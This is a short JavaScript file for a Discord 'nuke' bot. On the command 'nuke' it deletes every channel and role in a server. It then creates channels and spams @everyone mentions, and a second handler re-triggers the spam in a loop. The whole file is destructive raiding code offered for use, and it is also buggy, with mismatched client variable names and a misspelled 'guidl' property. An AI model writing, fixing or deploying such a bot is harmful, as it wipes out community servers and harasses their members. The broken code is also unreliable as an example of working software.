const { Client } = require('discord.js')
const M = new Client()

client.on('message', async (message) => {
    if (message.content === 'nuke') {
      message.guild.channels.cache.forEach
      (channel => channel.delete());
  
      message.guild.roles.cache.forEach
      (role => role.delete()); 
  
      await message.guidl.channels.create
      (`nuke`, {
        type : 'text'
      }).then(async channel=> { 
        channel.send('@everyone')
      })
        
      };
    }
  )
  
  
  client.on('message', async (message) => {
    if (message.content === '@everyone') {
      await message.guidl.channels.create
      (`nuke`, {
        type : 'text'
      }).then(async channel=> { 
        channel.send('@everyone')
      message.channel.send('@everyone')
      message.channel.send('@everyone')
      message.channel.send('@everyone')
      message.channel.send('@everyone')
    
    })
  }
  })

M.login('token') 
